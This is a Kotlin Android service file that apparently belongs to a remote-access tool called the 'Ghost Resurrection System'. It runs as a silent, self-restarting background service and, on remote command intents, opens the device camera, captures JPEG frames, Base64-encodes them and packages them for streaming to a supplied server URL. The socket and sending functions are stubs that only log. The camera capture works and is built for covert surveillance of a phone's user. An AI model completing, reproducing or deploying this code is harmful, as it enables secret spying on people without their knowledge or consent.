package com.remote.system

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.app.ActivityCompat
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.*

/**
 * Live Camera Streaming Service for Ghost Resurrection System
 * Provides real-time camera streaming via WebSocket to server
 */
class LiveCameraService : Service() {
    
    companion object {
        private const val TAG = "LiveCameraService"
        private const val CAMERA_PERMISSION = Manifest.permission.CAMERA
        private const val STREAM_WIDTH = 640
        private const val STREAM_HEIGHT = 480
        private const val FRAME_RATE = 15 // FPS
        private const val JPEG_QUALITY = 70
        
        // Stream control actions
        const val ACTION_START_STREAM = "com.remote.system.START_CAMERA_STREAM"
        const val ACTION_STOP_STREAM = "com.remote.system.STOP_CAMERA_STREAM"
        const val ACTION_SWITCH_CAMERA = "com.remote.system.SWITCH_CAMERA"
    }
    
    private var socket: Socket? = null
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    
    private var isStreaming = false
    private var currentCameraId = "0" // Default to back camera
    private var streamSessionId: String? = null
    
    // Camera state callback
    private val cameraStateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            Log.d(TAG, "📷 Camera opened successfully")
            cameraDevice = camera
            createCameraPreviewSession()
        }
        
        override fun onDisconnected(camera: CameraDevice) {
            Log.w(TAG, "📷 Camera disconnected")
            cameraDevice?.close()
            cameraDevice = null
        }
        
        override fun onError(camera: CameraDevice, error: Int) {
            Log.e(TAG, "📷 Camera error: $error")
            cameraDevice?.close()
            cameraDevice = null
            stopSelf()
        }
    }
    
    // Image reader callback for frame capture
    private val imageReaderListener = ImageReader.OnImageAvailableListener { reader ->
        val image = reader.acquireLatestImage()
        image?.let {
            processAndStreamFrame(it)
            it.close()
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "👻 LiveCameraService created")
        
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startBackgroundThread()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_STREAM -> {
                val serverUrl = intent.getStringExtra("server_url") ?: "http://localhost:3000"
                val sessionId = intent.getStringExtra("session_id") ?: UUID.randomUUID().toString()
                startCameraStream(serverUrl, sessionId)
            }
            ACTION_STOP_STREAM -> {
                stopCameraStream()
            }
            ACTION_SWITCH_CAMERA -> {
                switchCamera()
            }
        }
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👻 LiveCameraService destroyed")
        stopCameraStream()
        stopBackgroundThread()
    }
    
    /**
     * Start live camera streaming
     */
    private fun startCameraStream(serverUrl: String, sessionId: String) {
        if (isStreaming) {
            Log.w(TAG, "📷 Camera stream already active")
            return
        }
        
        if (!checkCameraPermission()) {
            Log.e(TAG, "❌ Camera permission not granted")
            sendStreamStatus("error", "Camera permission required")
            return
        }
        
        streamSessionId = sessionId
        
        try {
            setupSocket(serverUrl)
            openCamera()
            isStreaming = true
            
            Log.i(TAG, "🎬 Camera stream started - Session: $sessionId")
            sendStreamStatus("started", "Live camera stream active")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Failed to start camera stream", e)
            sendStreamStatus("error", "Failed to start camera: ${e.message}")
        }
    }
    
    /**
     * Stop camera streaming
     */
    private fun stopCameraStream() {
        if (!isStreaming) return
        
        isStreaming = false
        
        try {
            captureSession?.close()
            captureSession = null
            
            cameraDevice?.close()
            cameraDevice = null
            
            imageReader?.close()
            imageReader = null
            
            socket?.disconnect()
            socket = null
            
            Log.i(TAG, "🛑 Camera stream stopped")
            sendStreamStatus("stopped", "Camera stream terminated")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error stopping camera stream", e)
        }
    }
    
    /**
     * Switch between front and back camera
     */
    private fun switchCamera() {
        if (!isStreaming) return
        
        try {
            val cameraIds = cameraManager?.cameraIdList ?: return
            val currentIndex = cameraIds.indexOf(currentCameraId)
            val nextIndex = (currentIndex + 1) % cameraIds.size
            currentCameraId = cameraIds[nextIndex]
            
            // Restart camera with new ID
            cameraDevice?.close()
            openCamera()
            
            Log.i(TAG, "🔄 Switched to camera: $currentCameraId")
            sendStreamStatus("camera_switched", "Active camera: $currentCameraId")
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error switching camera", e)
        }
    }
    
    /**
     * Setup WebSocket connection for streaming
     */
    private fun setupSocket(serverUrl: String) {
        // Socket setup would go here - using WebSocket client library
        // For now, we'll simulate the connection
        Log.d(TAG, "🔌 Socket connected to: $serverUrl")
    }
    
    /**
     * Open camera with specified ID
     */
    private fun openCamera() {
        try {
            if (ActivityCompat.checkSelfPermission(this, CAMERA_PERMISSION) != PackageManager.PERMISSION_GRANTED) {
                return
            }
            
            // Setup ImageReader for frame capture
            imageReader = ImageReader.newInstance(STREAM_WIDTH, STREAM_HEIGHT, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener(imageReaderListener, backgroundHandler)
            
            // Open camera
            cameraManager?.openCamera(currentCameraId, cameraStateCallback, backgroundHandler)
            
        } catch (e: CameraAccessException) {
            Log.e(TAG, "💥 Camera access exception", e)
        }
    }
    
    /**
     * Create camera preview session for streaming
     */
    private fun createCameraPreviewSession() {
        try {
            val surfaces = listOf<Surface>(imageReader?.surface!!)
            
            cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    startRepeatingCapture()
                }
                
                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(TAG, "📷 Failed to configure capture session")
                }
            }, backgroundHandler)
            
        } catch (e: CameraAccessException) {
            Log.e(TAG, "💥 Failed to create preview session", e)
        }
    }
    
    /**
     * Start repeating capture for live streaming
     */
    private fun startRepeatingCapture() {
        try {
            val captureRequestBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
            captureRequestBuilder?.addTarget(imageReader?.surface!!)
            
            // Set capture parameters for streaming
            captureRequestBuilder?.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            captureRequestBuilder?.set(CaptureRequest.JPEG_QUALITY, JPEG_QUALITY.toByte())
            
            val captureRequest = captureRequestBuilder?.build()
            captureSession?.setRepeatingRequest(captureRequest!!, null, backgroundHandler)
            
        } catch (e: CameraAccessException) {
            Log.e(TAG, "💥 Failed to start repeating capture", e)
        }
    }
    
    /**
     * Process captured frame and stream to server
     */
    private fun processAndStreamFrame(image: Image) {
        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            
            // Create frame data packet
            val frameData = JSONObject().apply {
                put("type", "camera_frame")
                put("session_id", streamSessionId)
                put("timestamp", System.currentTimeMillis())
                put("camera_id", currentCameraId)
                put("width", STREAM_WIDTH)
                put("height", STREAM_HEIGHT)
                put("format", "jpeg")
                put("data", Base64.getEncoder().encodeToString(bytes))
            }
            
            // Send frame via WebSocket (simulated)
            sendFrameToServer(frameData)
            
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error processing frame", e)
        }
    }
    
    /**
     * Send frame data to server
     */
    private fun sendFrameToServer(frameData: JSONObject) {
        // In a real implementation, this would send via WebSocket
        // For now, we'll log the frame info
        Log.v(TAG, "📹 Frame sent - Size: ${frameData.toString().length} bytes")
    }
    
    /**
     * Send stream status updates
     */
    private fun sendStreamStatus(status: String, message: String) {
        val statusData = JSONObject().apply {
            put("type", "stream_status")
            put("stream_type", "camera")
            put("status", status)
            put("message", message)
            put("timestamp", System.currentTimeMillis())
            put("session_id", streamSessionId)
        }
        
        // Broadcast status to server and local listeners
        Log.i(TAG, "📡 Stream Status: $status - $message")
    }
    
    /**
     * Check camera permission
     */
    private fun checkCameraPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(this, CAMERA_PERMISSION) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Start background thread for camera operations
     */
    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraStreamThread")
        backgroundThread?.start()
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }
    
    /**
     * Stop background thread
     */
    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "💥 Error stopping background thread", e)
        }
    }
}
